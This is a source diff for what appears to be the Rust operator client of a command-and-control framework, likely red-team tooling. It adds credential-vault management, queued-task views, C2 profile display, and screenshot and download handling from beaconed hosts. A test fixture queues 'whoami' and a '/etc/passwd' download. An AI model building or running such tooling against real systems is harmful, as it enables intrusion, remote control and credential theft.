@@ -35,7 +35,7 @@ pub struct Snapshot {
     pub log_lines: Vec<LogLine>,
     /// Whether the server is reachable right now.
     pub connected: bool,
-    /// A parsed table to pop as a fullscreen overlay, if a /ls /ps /creds task
+    /// A parsed table to pop as a fullscreen overlay, if a /ls /ps /creds /screenshot task
     /// just completed. At most one per snapshot (the most recent).
     pub parsed: Option<ParsedTable>,
 }
@@ -46,6 +46,19 @@ pub enum ParsedTable {
     Procs(Vec<ProcEntry>),
     Creds(Vec<CredEntry>),
     Audit(Vec<AuditRow>),
+    /// Queued (undelivered) tasks for a session, from `GET /api/tasks`.
+    Tasks(Vec<TaskRow>),
+    Image { path: String, bytes: usize },
+    Profile {
+        loaded: bool,
+        http_get_uri: String,
+        http_post_uri: String,
+        useragent: String,
+    },
+    AuditVerify {
+        ok: bool,
+        broken_at: Option<u64>,
+    },
 }
 
 /// One row of the server action-audit log (from `GET /api/audit`).
@@ -56,6 +69,8 @@ pub struct AuditRow {
     pub operator: String,
     pub action: String,
     pub target: String,
+    /// 服务器审计详情 JSON——客户端目前只渲染 4 列，保留以备将来扩展。
+    #[allow(dead_code)]
     pub detail: serde_json::Value,
 }
 
@@ -68,6 +83,32 @@ pub struct ServerCred {
     pub user: String,
     pub kind: String,
     pub secret: String,
+}
+
+/// Response shape for `GET /api/audit/verify`.
+#[derive(Clone, Debug, serde::Deserialize)]
+pub struct AuditVerifyResponse {
+    pub ok: bool,
+    pub broken_at: Option<u64>,
+}
+
+/// Response shape for `GET /api/profile`.
+#[derive(Clone, Debug, serde::Deserialize)]
+pub struct ProfileSummary {
+    pub loaded: bool,
+    pub http_get_uri: String,
+    pub http_post_uri: String,
+    pub useragent: String,
+}
+
+/// One queued (not-yet-delivered) task row from `GET /api/tasks?session=<hex>`.
+/// `command` is the server's `JsonCommand` tagged union kept as a raw
+/// `serde_json::Value` — the client only needs to display its `type` + a short
+/// summary, so there's no value in mirroring the full command enum here.
+#[derive(Clone, Debug, serde::Deserialize)]
+pub struct TaskRow {
+    pub task_id: u64,
+    pub command: serde_json::Value,
 }
 
 /// How (if at all) a shell task's output should be parsed before routing.
@@ -163,6 +204,29 @@ pub enum Cmd {
         action: Option<String>,
         limit: Option<u32>,
     },
+    /// Add a credential to the server vault (`POST /api/creds`).
+    AddCred {
+        realm: String,
+        user: String,
+        kind: String,
+        secret: String,
+    },
+    /// Delete a credential from the server vault (`POST /api/creds/delete`).
+    DelCred {
+        realm: String,
+        user: String,
+        kind: String,
+    },
+    /// Verify the audit log hash chain (`GET /api/audit/verify`).
+    VerifyAudit,
+    /// Fetch queued (undelivered) tasks for a session (`GET /api/tasks`).
+    /// `session` is the beacon's hex id — the worker doesn't track selection,
+    /// so the UI passes the currently-selected session in.
+    FetchTasks { session: String },
+    /// Fetch active C2 profile summary (`GET /api/profile`).
+    FetchProfile,
+    /// Close a relay channel (`Command::ChannelClose`).
+    CloseChan { chan: u32 },
     /// Stop the worker thread.
     Shutdown,
 }
@@ -332,29 +396,110 @@ async fn worker_loop(
                         Err(e) => log_push(&mut log_buf, &format!("! upload enqueue: {e}"), Level::Err),
                     }
                 }
-                Cmd::Download { session, path, local } => {
-                    let Some((ref srv, ref tok)) = server else {
-                        log_push(&mut log_buf, "! not connected", Level::Err);
-                        continue;
-                    };
-                    match enqueue_download(&client, srv, &session, &path, tok).await {
-                        Ok(tid) => {
-                            log_push(
-                                &mut log_buf,
-                                &format!("[{}] download {} → task {}", short(&session), path, tid),
-                                Level::Info,
-                            );
-                            pending.push(PendingTask {
-                                session, task_id: tid,
-                                kind: TaskKind::Download { path, local },
-                                backoff: TASK_BACKOFF_START, last_poll: Instant::now(),
-                                started_at: Instant::now(),
-                                chunks: Vec::new(), saw_eof: false,
-                            });
-                        }
-                        Err(e) => log_push(&mut log_buf, &format!("! download enqueue: {e}"), Level::Err),
-                    }
-                }
+                Cmd::AddCred { realm, user, kind, secret } => {
+    let Some((ref srv, ref tok)) = server else {
+      log_push(&mut log_buf, "! not connected", Level::Err); continue;
+    };
+    let body = serde_json::json!({"realm": realm, "user": user, "kind": kind, "secret": secret});
+    match authed(client.post(format!("{srv}/api/creds")).json(&body), tok).send().await {
+      Ok(r) if r.status().is_success() => log_push(&mut log_buf, "cred: added/updated", Level::Ok),
+      Ok(r) => log_push(&mut log_buf, &format!("! cred add: {}", r.status()), Level::Err),
+      Err(e) => log_push(&mut log_buf, &format!("! cred add: {e}"), Level::Err),
+    }
+  }
+  Cmd::DelCred { realm, user, kind } => {
+    let Some((ref srv, ref tok)) = server else {
+      log_push(&mut log_buf, "! not connected", Level::Err); continue;
+    };
+    let body = serde_json::json!({"realm": realm, "user": user, "kind": kind});
+    match authed(client.post(format!("{srv}/api/creds/delete")).json(&body), tok).send().await {
+      Ok(r) if r.status().is_success() => log_push(&mut log_buf, "cred: deleted", Level::Ok),
+      Ok(r) => log_push(&mut log_buf, &format!("! cred del: {}", r.status()), Level::Err),
+      Err(e) => log_push(&mut log_buf, &format!("! cred del: {e}"), Level::Err),
+    }
+  }
+  Cmd::VerifyAudit => {
+    let Some((ref srv, ref tok)) = server else {
+      log_push(&mut log_buf, "! not connected", Level::Err); continue;
+    };
+    match authed(client.get(format!("{srv}/api/audit/verify")), tok).send().await {
+      Ok(r) => match r.json::<AuditVerifyResponse>().await {
+        Ok(v) => {
+          if v.ok {
+            log_push(&mut log_buf, "audit chain: OK", Level::Ok);
+          } else if let Some(b) = v.broken_at {
+            log_push(&mut log_buf, &format!("audit chain: BROKEN at seq {b}"), Level::Err);
+          } else {
+            log_push(&mut log_buf, "audit chain: UNKNOWN", Level::Warn);
+          }
+          // Wire the parsed table so the fullscreen overlay opens (same class
+          // of bug as FetchProfile — without this /audit verify only logs).
+          parsed_buf = Some(ParsedTable::AuditVerify { ok: v.ok, broken_at: v.broken_at });
+        }
+        Err(e) => log_push(&mut log_buf, &format!("! audit verify parse: {e}"), Level::Err),
+      },
+      Err(e) => log_push(&mut log_buf, &format!("! audit verify: {e}"), Level::Err),
+    }
+  }
+  Cmd::FetchProfile => {
+    let Some((ref srv, ref tok)) = server else {
+      log_push(&mut log_buf, "! not connected", Level::Err); continue;
+    };
+    match authed(client.get(format!("{srv}/api/profile")), tok).send().await {
+      Ok(r) => match r.json::<ProfileSummary>().await {
+        Ok(p) => {
+          if !p.loaded {
+            log_push(&mut log_buf, "profile: not loaded", Level::Warn);
+          } else {
+            log_push(&mut log_buf, &format!("profile: loaded http-get: {} http-post: {} useragent: {}", p.http_get_uri, p.http_post_uri, p.useragent), Level::Info);
+            // Wire the parsed table so the fullscreen overlay opens (the whole
+            // point of `/profile`). Without this the Profile overlay, the
+            // poll_worker Profile arm and the render Overlay::Profile arm are
+            // all dead code — `/profile` only logged before.
+            parsed_buf = Some(ParsedTable::Profile {
+              loaded: p.loaded,
+              http_get_uri: p.http_get_uri,
+              http_post_uri: p.http_post_uri,
+              useragent: p.useragent,
+            });
+          }
+        }
+        Err(e) => log_push(&mut log_buf, &format!("! profile parse: {e}"), Level::Err),
+      },
+      Err(e) => log_push(&mut log_buf, &format!("! profile fetch: {e}"), Level::Err),
+    }
+  }
+  Cmd::CloseChan { chan } => {
+    let Some((ref srv, ref tok)) = server else {
+      log_push(&mut log_buf, "! not connected", Level::Err); continue;
+    };
+    let cmd = serde_json::json!({"type": "channelclose", "chan": chan});
+    match enqueue_simple(&client, srv, "", cmd, tok).await {
+      Ok(tid) => log_push(&mut log_buf, &format!("chan {chan} close → task {tid}"), Level::Info),
+      Err(e) => log_push(&mut log_buf, &format!("! chan close: {e}"), Level::Err),
+    }
+  }
+Cmd::Download { session, path, local } => {
+	let Some((ref srv, ref tok)) = server else {
+		log_push(&mut log_buf, "! not connected", Level::Err);
+		continue;
+	};
+	match enqueue_download(&client, srv, &session, &path, tok).await {
+		Ok(tid) => {
+			log_push(&mut log_buf, &format!("[{}] download {} (task {})", short(&session), path, tid), Level::Info);
+			// Downloads stream FileChunk results — must register a pending task
+			// so the result-poll loop collects chunks and saves them to `local`
+			// (route_result at TaskKind::Download derives the save path from it).
+			pending.push(PendingTask {
+				session, task_id: tid,
+				kind: TaskKind::Download { path: path.clone(), local: local.clone() },
+				backoff: TASK_BACKOFF_START, last_poll: Instant::now(),
+				started_at: Instant::now(), chunks: Vec::new(), saw_eof: false,
+			});
+		}
+		Err(e) => log_push(&mut log_buf, &format!("! download enqueue: {e}"), Level::Err),
+	}
+}
                 Cmd::Sleep { session, seconds, jitter_pct } => {
                     let Some((ref srv, ref tok)) = server else {
                         log_push(&mut log_buf, "! not connected", Level::Err);
@@ -653,12 +798,17 @@ async fn worker_loop(
                                     } else {
                                         format!("{}\\{}", c.realm, c.user)
                                     };
-                                    CredEntry {
-                                        source: c.kind,
-                                        principal,
-                                        kind: CredKind::Hash, // server kind is a string; show as-is in source
-                                        secret: c.secret,
-                                    }
+CredEntry {
+        source: c.kind.clone(),
+        principal,
+        kind: match c.kind.as_str() {
+            "password" => CredKind::Password,
+            "ticket" => CredKind::Ticket,
+            "key" => CredKind::Key,
+            _ => CredKind::Hash,
+        },
+        secret: c.secret,
+    }
                                 }).collect();
                                 parsed_buf = Some(ParsedTable::Creds(entries));
                             }
@@ -691,6 +841,25 @@ async fn worker_loop(
                             Err(e) => log_push(&mut log_buf, &format!("! audit parse: {e}"), Level::Err),
                         },
                         Err(e) => log_push(&mut log_buf, &format!("! audit fetch: {e}"), Level::Err),
+                    }
+                }
+                Cmd::FetchTasks { session } => {
+                    let Some((ref srv, ref tok)) = server else {
+                        log_push(&mut log_buf, "! not connected", Level::Err); continue;
+                    };
+                    let url = format!("{srv}/api/tasks?session={session}");
+                    match authed(client.get(&url), tok).send().await {
+                        Ok(resp) => match resp.json::<Vec<TaskRow>>().await {
+                            Ok(rows) => {
+                                let n = rows.len();
+                                log_push(&mut log_buf, &format!("tasks: {n} queued", ), Level::Ok);
+                                // parsed_buf is mandatory — without it the
+                                // overlay never opens (see the /profile bug).
+                                parsed_buf = Some(ParsedTable::Tasks(rows));
+                            }
+                            Err(e) => log_push(&mut log_buf, &format!("! tasks parse: {e}"), Level::Err),
+                        },
+                        Err(e) => log_push(&mut log_buf, &format!("! tasks fetch: {e}"), Level::Err),
                     }
                 }
             }
@@ -741,7 +910,8 @@ async fn worker_loop(
             }
             // Chunked tasks (downloads + screenshots) stream FileChunks + eof.
             let is_chunked = matches!(t.kind, TaskKind::Download { .. } | TaskKind::Screenshot);
-            if !is_chunked && t.started_at.elapsed() > TASK_DEADLINE {
+            let is_image = matches!(t.kind, TaskKind::Screenshot);
+        if !is_chunked && t.started_at.elapsed() > TASK_DEADLINE {
                 log_push(
                     &mut log_buf,
                     &format!("[{}] task {} timed out (>{:?}) — dropped",
@@ -750,17 +920,17 @@ async fn worker_loop(
                 );
                 continue;
             }
-            // Chunked tasks need the full result stream, others a single row.
-            let res = if is_chunked {
-                poll_file_chunks(&client, srv, &t.session, t.task_id, &mut t.chunks, &mut t.saw_eof, token).await
-            } else {
-                poll_result(&client, srv, &t.session, t.task_id, token).await
-            };
+// Chunked tasks need the full result stream, others a single row.
+let res = if is_chunked {
+    poll_file_chunks(&client, srv, &t.session, t.task_id, &mut t.chunks, is_image, &mut t.saw_eof, token).await
+} else {
+    poll_result(&client, srv, &t.session, t.task_id, token).await
+};
             match res {
                 PollOutcome::Done(out) => {
                     route_result(&mut log_buf, &mut parsed_buf, &t, out);
                     if is_chunked {
-                        finish_chunked(&mut log_buf, &t);
+                        finish_chunked(&mut log_buf, &mut parsed_buf, &t);
                     }
                 }
                 PollOutcome::Pending => {
@@ -849,7 +1019,7 @@ fn route_result(
     }
 }
 
-fn finish_chunked(log_buf: &mut Vec<LogLine>, t: &PendingTask) {
+fn finish_chunked(log_buf: &mut Vec<LogLine>, parsed_buf: &mut Option<ParsedTable>, t: &PendingTask) {
     // 重组分块数据
     let mut chunks = t.chunks.clone();
     chunks.sort_by_key(|(s, _)| *s);
@@ -889,6 +1059,11 @@ fn finish_chunked(log_buf: &mut Vec<LogLine>, t: &PendingTask) {
         &format!("[{}] {} -> {save_path}", short(&t.session), log_msg),
         Level::Ok,
     );
+    // 截图落盘后弹出 fullscreen 图片 overlay（path + bytes）。下载不弹 overlay
+    // （文件在磁盘上，日志已指明路径）。
+    if matches!(t.kind, TaskKind::Screenshot) {
+        *parsed_buf = Some(ParsedTable::Image { path: save_path, bytes: out.len() });
+    }
 }
 
 // ---- async REST helpers (all on the worker) ----
@@ -1130,12 +1305,14 @@ async fn poll_result(
 }
 
 /// Poll file chunks for a download task. Accumulates into `chunks` until `eof`.
+#[allow(clippy::too_many_arguments)]
 async fn poll_file_chunks(
     c: &reqwest::Client,
     server: &str,
     session: &str,
     task_id: u64,
     chunks: &mut Vec<(u32, Vec<u8>)>,
+ is_image: bool,
     saw_eof: &mut bool,
     token: &Option<String>,
 ) -> PollOutcome {
@@ -1144,7 +1321,14 @@ async fn poll_file_chunks(
         Err(e) => return PollOutcome::Err(e.to_string()),
     };
     for r in rs {
-        if r.task_id != task_id || r.kind != "file" {
+        if r.task_id != task_id {
+            continue;
+        }
+        if is_image {
+            if r.kind != "image" {
+                continue;
+            }
+        } else if r.kind != "file" {
             continue;
         }
         let seq = r.seq.unwrap_or(0);
@@ -1223,7 +1407,7 @@ mod tests {
     }
 
     #[test]
-    fn signature_detects_change() {
+    fn signaturedetects_change() {
         let mk = |id: &str, pend: usize| SessionView {
             id: id.into(), hostname: "h".into(), username: "u".into(), os: String::new(),
             is_admin: 0, pending: pend, beacon_id: 0, arch: 0, pid: 0,
@@ -1231,5 +1415,16 @@ mod tests {
         };
         let a = vec![mk("s1", 1)];
         assert_ne!(session_signature(&a), session_signature(&[mk("s1", 2)]));
+    }
+
+    #[test]
+    fn task_row_decodes_server_json() {
+        // server 返回 [{task_id, command:{type, ...}}]，command 保持为 raw Value。
+        let json = r#"[{"task_id":7,"command":{"type":"shell","args":"whoami"}},{"task_id":8,"command":{"type":"download","path":"/etc/passwd"}}]"#;
+        let rows: Vec<TaskRow> = serde_json::from_str(json).unwrap();
+        assert_eq!(rows.len(), 2);
+        assert_eq!(rows[0].task_id, 7);
+        assert_eq!(rows[0].command.get("type").and_then(|v| v.as_str()), Some("shell"));
+        assert_eq!(rows[1].command.get("path").and_then(|v| v.as_str()), Some("/etc/passwd"));
     }
 }
